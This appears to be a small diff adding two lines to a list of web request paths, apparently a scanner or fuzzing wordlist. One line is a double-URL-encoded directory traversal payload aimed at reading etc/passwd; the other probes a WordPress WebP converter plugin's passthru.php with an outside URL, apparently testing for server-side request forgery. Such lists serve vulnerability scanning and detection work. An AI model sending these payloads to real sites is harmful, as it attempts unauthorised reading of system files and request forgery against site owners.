@@ -1,0 +1,2 @@
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https://example.com
